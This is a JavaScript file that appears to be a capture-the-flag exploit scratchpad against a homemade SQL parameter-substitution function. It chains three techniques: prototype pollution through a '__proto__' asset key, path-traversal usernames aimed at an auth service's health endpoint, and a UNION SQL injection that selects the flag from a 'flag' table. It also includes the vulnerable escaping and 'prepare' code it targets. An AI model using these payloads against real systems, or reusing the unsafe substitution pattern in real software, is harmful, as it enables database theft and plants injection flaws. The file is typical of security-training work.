function sqlEscape(value) {
    switch (typeof value) {
        case 'string':
            return `'${value.replace(/[^\x20-\x7e]|[']/g, '')}'`;
        case 'number':
            return isFinite(value) ? String(value) : sqlEscape(String(value));
        case 'boolean':
            return String(value);
        default:
            return value == null ? 'NULL' : sqlEscape(JSON.stringify(value));
    }
}

function prepare(query, namedParams) {
    let filledQuery = query;

    const escapedParams = Object.fromEntries(
        Object.entries(namedParams)
            .map(([key, value]) => ([key, sqlEscape(value)]))
    );

    for (const key in escapedParams) {
        filledQuery = filledQuery.replaceAll(`:${key}`, escapedParams[key]);
    }

    return filledQuery;
}

async function makeTransaction(username, txId, asset, amount) {
    const query = prepare('INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)', {
        amount,
        asset,
        username,
        txId,
    });
    console.log(query);
}


(async () => {
    const got = require('got');
    const AUTH_SERVICE = "http://127.0.0.1:3001"
    username = "../../../health#"

    const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, {
        headers: { authorization: "secret-auth-token" },
        json: { password: "123" },
    });
    console.log(r.statusCode)
})


let asset = "__proto__"
let username = "::txId/../../../../health#"
let action = "byc_404') union select 404302404,'byc',1,(select flag from flag)-- "
const amount = 1

const transactions = {};
const assetTransactions = transactions[asset] ?? (transactions[asset] = {});

const txId = require('crypto').randomInt(2**48 - 1);
assetTransactions[txId] = action;

namedParams = {
    amount,
    asset,
    username,
    txId,
}

const escapedParams = Object.fromEntries(
    Object.entries(namedParams)
        .map(([key, value]) => ([key, sqlEscape(value)]))
);

console.log(Object.prototype);
console.log(escapedParams)

let filledQuery = 'INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)';

for (const key in escapedParams) {
    console.log(key, escapedParams[key]);
    filledQuery = filledQuery.replace(new RegExp(`:${key}`,'ig'), escapedParams[key]);
}

console.log(filledQuery);
